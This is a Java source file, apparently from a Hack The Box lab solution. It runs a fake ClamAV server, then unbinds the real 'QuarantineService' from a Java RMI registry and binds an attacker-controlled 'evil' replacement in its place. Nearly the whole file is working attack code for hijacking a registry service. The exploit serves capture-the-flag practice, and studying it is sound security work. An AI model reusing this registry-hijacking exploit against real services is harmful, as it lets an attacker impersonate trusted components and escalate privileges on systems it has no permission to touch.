package com.htb.hosting.rmi;

import com.htb.hosting.rmi.myclam.EvilClam;
import com.htb.hosting.rmi.quarantine.QuarantineConfiguration;
import com.htb.hosting.rmi.quarantine.QuarantineService;
import com.htb.hosting.rmi.quarantine.QuarantineServiceImpl;

import java.io.File;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.concurrent.Executors;

public class Server {

   public static void main(String[] args) {
      try {
         Executors.newSingleThreadExecutor().execute(() -> {
            final EvilClam evilClam = new EvilClam();
            evilClam.start();
         });

         System.setProperty("java.rmi.server.hostname", "registry.webhosting.htb");
         String quarantineDirectory = "/tmp/quarantine2";
         String scanDirectory = "/home/developer/ma_tools/boom";
         String clamAvHost = "localhost";

         QuarantineConfiguration config = new QuarantineConfiguration(new File(quarantineDirectory), new File(scanDirectory), clamAvHost, 3311, 1000);
         System.out.println("Creating evil configuration: " + config);
         QuarantineServiceImpl quarantineServiceImpl = new QuarantineServiceImpl(config);
         QuarantineService quarantineServiceObjPtr = (QuarantineService) UnicastRemoteObject.exportObject(quarantineServiceImpl, 0);

         System.out.println("New configuration located at: " + quarantineServiceObjPtr.toString());
         System.out.println();
         System.out.println("Unbinding real QuarantineService from Registry");

         Registry registry = LocateRegistry.getRegistry("localhost", 9002);
         registry.unbind("QuarantineService");

         System.out.println("Binding evil QuarantineService to Registry");
         registry.bind("QuarantineService", quarantineServiceObjPtr);

         new Thread(() -> {
            synchronized (Server.class) {
               try {
                  Server.class.wait();
               } catch (InterruptedException ignored) {
               }
            }
         }).start();


      } catch (Exception e) {
         e.printStackTrace();
      }
   }
}
